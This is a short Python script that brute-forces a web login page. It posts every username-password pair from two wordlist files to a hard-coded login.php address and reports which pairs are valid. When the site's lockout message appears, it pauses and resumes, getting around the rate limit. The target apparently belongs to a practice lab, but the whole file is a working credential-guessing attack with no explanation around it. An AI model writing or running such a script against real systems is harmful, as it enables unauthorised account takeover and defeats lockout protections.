import requests
import time

userpass_file = "pass.txt" #path to password file
username_file = "names.txt" # path to username file
url = "http://94.237.49.9:53458/login.php" 

lock_message = "Too many login failures"

with open(username_file,"r") as file:
    for user_name in file:
        user_name = user_name.strip()
        with open(userpass_file, "r") as fh:
            for fline in fh:
                # take username
                password = fline.strip()
                    # prepare POST data
                data = {
                    "userid": user_name,
                    "passwd": password,
                    "submit": "submit"
                }
        
                res = requests.post(url, data=data)
                #print(res.text)
                if "Invalid credentials" in res.text:
                    print("[-] Invalid credentials: userid:{} passwd:{}".format(user_name, password))
                elif "Messages" in res.text:
                    print("[+] Valid credentials: userid:{} passwd:{}".format(user_name, password))
                elif lock_message in res.text:
                    print("[-] Hit rate limit, sleeping 30")
                    time.sleep(31)
            fh.close()
    file.close()
